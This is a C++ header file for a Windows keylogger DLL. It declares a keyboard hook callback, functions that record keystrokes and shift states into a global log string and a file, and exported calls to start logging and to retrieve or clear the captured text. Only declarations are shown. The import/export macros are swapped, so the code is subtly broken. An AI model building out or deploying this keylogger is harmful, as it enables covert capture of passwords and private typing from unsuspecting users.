#pragma once

#ifdef KEYLOGGER_EXPORTS
#define LOGLIB_API __declspec(dllimport)
#else
#define LOGLIB_API __declspec(dllexport)
#endif

#ifndef DLL_INCLUDES
#define DLL_INCLUDES
#include <Windows.h>
#include <thread>
#include <string>
#include <string_view>
#include <fstream>
#endif

inline std::ofstream file;

//global log string
inline std::string logStr;


inline int sizeOfLogStr = 0;

void SetGlobalKeyStates();

void PrintSpecialKeys(const int& key, const bool& shiftState);

void PrintDigits(const int& key, const bool& shiftState);

void PrintAlpha(const int& key, const bool&& upper);

inline void LogKeys(const std::string_view&&);

inline void LogKeys(const int&&);

inline void LogDigit(const int&&);

extern "C++" LOGLIB_API inline std::string GetLog();

extern "C++" LOGLIB_API inline void ClearLogStr();

extern "C++" LOGLIB_API inline int GetSizeOfLogStr();

extern "C++" LOGLIB_API void StartLog();

extern "C++" LOGLIB_API inline void InitFile();

extern "C++" LOGLIB_API inline void CloseFile();

extern "C" LOGLIB_API LRESULT CALLBACK KeyboardProc(int, WPARAM, LPARAM);